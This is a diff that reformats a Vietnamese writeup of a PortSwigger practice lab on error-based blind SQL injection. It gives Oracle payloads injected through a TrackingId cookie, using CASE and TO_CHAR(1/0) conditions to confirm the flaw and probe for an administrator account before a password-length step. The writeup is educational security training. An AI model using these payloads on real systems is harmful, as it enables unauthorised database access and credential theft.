@@ -1,47 +1,51 @@
 
 
-Hello mọi người. Chào mừng mọi người đến với writeup của mình.
-Đây là writeup đầu tiên của mình viết về khai thác chủng lỗi SQL injection để tìm mật khẩu của 1 tài khoản.
-Đây là lab thực hành trong web PortSwigger. Writeup này mình viết chắc chỉ bạn nào có kiến thức an toàn thông tin mới hiểu.
-các bạn còn lại hhiểu đơn giản đây là các bước thực hiện hack mật khẩu. Đây chỉ là 1 lab để luyện thoi, còn thực tế hiện này thì hầu hết web bảo mật tốt nên không áp dụng được. 
+>🔍 Error-Based SQL Injection – PortSwigger Lab Writeup
 
-# Error - based SQLi
+Hello mọi người!Chào mừng đến với writeup đầu tiên của mình về khai thác SQL Injection để tìm mật khẩu của một tài khoản.Bài lab này được thực hiện trên nền tảng PortSwigger Web Security Academy.
+
+>⚠️ Nếu bạn không có nền tảng về bảo mật, có thể sẽ hơi khó hiểu. Nhưng bạn có thể coi đây là các bước "hack mật khẩu" trong môi trường mô phỏng.Lưu ý: Đây chỉ là lab để luyện tập, trong thực tế hiện nay các web hiện đại đã bảo mật tốt hơn nhiều  
+
 
 
 ## condition error based SQLi
 
 ### Vấn đề của Blind SQLi 
 Phản hồi của giao diện không thay đổi dù truy vấn SQL có trả về gt hay không. Ứng dụng không hiện thị dữ liệu truy vấn
-OR 1=1 OR 1==2 thì giao diện trả về giông nhau nen khong dùng duoc
+`OR 1=1 OR 1==2` thì giao diện trả về giông nhau nen khong dùng duoc
 ### Tạo lỗi có điều kiện ( Conditional Error )
 Cố tình gây lỗi trong câu truy vấn SQL nhưng trong DK bạn chèn vào là đúng
 
 Khi lỗi xảy ra thì giao diện có thể hiện thị lỗi
 
-SELECT * FROM users WHERE username = '$input'
+`SELECT * FROM users WHERE username = '$input'`
 
-' AND (SELECT 1/0 FROM dual WHERE 'a'='a') -- 
+`' AND (SELECT 1/0 FROM dual WHERE 'a'='a') -- `
 
 ### Thực hành
+```sql
 CASE 
     WHEN điều_kiện_1 THEN giá_trị_1
     WHEN điều_kiện_2 THEN giá_trị_2
     ...
     ELSE giá_trị_mặc_định
 END
-
+```
+```sql
 CASE biểu_thức
     WHEN giá_trị_1 THEN kết_quả_1
     WHEN giá_trị_2 THEN kết_quả_2
     ...
     ELSE kết_quả_mặc_định
 END
+```
 
 Note: các nhánh phải cùng kiểu dữ liệu.
 
 
 
 Ví dụ:
+```sql
 SELECT 
   CASE department_id
     WHEN 10 THEN 'HR'
@@ -49,6 +53,8 @@ SELECT
     ELSE 'Other'
   END AS department_name
 FROM employees;
+```
+
 
 Khi điều kiện where đúng mới có dòng trả về nen mới thực thi select.
 Ngược lại sẽ trả về 0 dòng nên không thực thi select.
@@ -64,22 +70,22 @@ Chúng ta sẽ dùng burpsuite để khai thác lỗ hông này
 
 Let's go!!!
 
-B1. thử trackingID có bị SQLi không
+-B1. thử trackingID có bị SQLi không
 ![alt text](image.png)
 ![alt text](image-1.png)
 
-chèn trackingID = abc' thì bị lỗi còn abc'' thì không bởi vì nó sẽ hiểu là 
+chèn `trackingID = abc'` thì bị lỗi còn abc'' thì không bởi vì nó sẽ hiểu là 
 trackingID chuỗi thực tế là abc' ( vì '' là cách escape dấu ' )
 -> có SQLi
 
-B2. thử abc'||( select '' from dual)|| '  . Nhớ đặt select trong dấu () nhé, nếu không nó sẽ không hiểu là nối chuỗi đâu!
+-B2. thử `abc'||( select '' from dual)|| '`  . Nhớ đặt select trong dấu () nhé, nếu không nó sẽ không hiểu là nối chuỗi đâu!
 trong oracle '' = NULL trong mysql
 ![alt text](image-2.png)
 
 -> ta có thể biết hệ thống dung oracle( dual la bảng ảo trong oracle)
 và server không filter, có thể chạy lệnh sql hợp lệ
 
-B3. thử truy vấn 1 bảng không có thật để chứng minh câu sql có được thực thi thực sự trên dữ liệu
+-B3. thử truy vấn 1 bảng không có thật để chứng minh câu sql có được thực thi thực sự trên dữ liệu
 backend hay không.
 
 FROM dual: giống như bạn bắn tín hiệu, thấy "server có nghe".
@@ -87,21 +93,21 @@ FROM not_a_real_table: giống như bạn hỏi một câu khó, server nói "kh
 Để làm chắc chắn hơn có thẻ thực thi Sql vì đây là blind SQLi
 ![alt text](image-3.png)
 
-B4. Test điều kiện đúng/sai bằng lõi chia cho 00
+-B4. Test điều kiện đúng/sai bằng lõi chia cho 00
 
-Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ''END from dual) ||'
+`Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE ''END from dual) ||'`
 ![alt text](image-4.png)
-Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''END from dual) ||'
+`Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''END from dual) ||'`
 ![alt text](image-5.png)
 
-B5. Kiểm tra sử tồn tại của administrator trong bảng users (Đề bài cho )
+-B5. Kiểm tra sử tồn tại của administrator trong bảng users (Đề bài cho )
 
-Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=22) THEN TO_CHAR(1/0) ELSE ''END from users where username = 'administrator') ||'
+`Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=22) THEN TO_CHAR(1/0) ELSE ''END from users where username = 'administrator') ||'`
 ![alt text](image-6.png)
-Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''END from users where username = 'administrator') ||'
+`Cookie: TrackingId=WMIqZXutPPFpM9id'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''END from users where username = 'administrator') ||'`
 ![alt text](image-7.png)
 
-B6. Tính độ dài của password
+-B6. Tính độ dài của password
 
 ![alt text](image-8.png) 
 ![alt text](image-9.png)
